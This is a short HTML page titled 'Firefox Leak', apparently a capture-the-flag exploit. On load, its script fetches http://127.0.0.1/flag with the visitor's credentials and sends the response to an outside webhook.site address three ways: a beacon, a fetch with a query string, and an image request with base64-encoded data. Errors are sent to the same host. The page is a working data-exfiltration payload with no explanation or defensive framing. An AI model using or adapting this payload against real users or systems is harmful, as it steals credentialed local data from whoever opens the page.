<!DOCTYPE html>
<html>
<body>
<h1>Firefox Leak</h1>
<script>
// In Firefox, localhost might be treated specially
async function leak() {
  try {
    const response = await fetch('http://127.0.0.1/flag', {
      method: 'GET',
      credentials: 'include'
    });

    const flag = await response.text();

    // Multiple exfiltration methods
    // Method 1: Beacon (works in background)
    navigator.sendBeacon('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', flag);

    // Method 2: Regular fetch
    await fetch('https://webhook.site/5dc1560a-274c-4539-af81-568512041310?flag=' + encodeURIComponent(flag));

    // Method 3: Image
    new Image().src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?f=' + btoa(flag);

  } catch(err) {
    navigator.sendBeacon('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', 'Error: ' + err.message);
  }
}

leak();
</script>
</body>
</html>
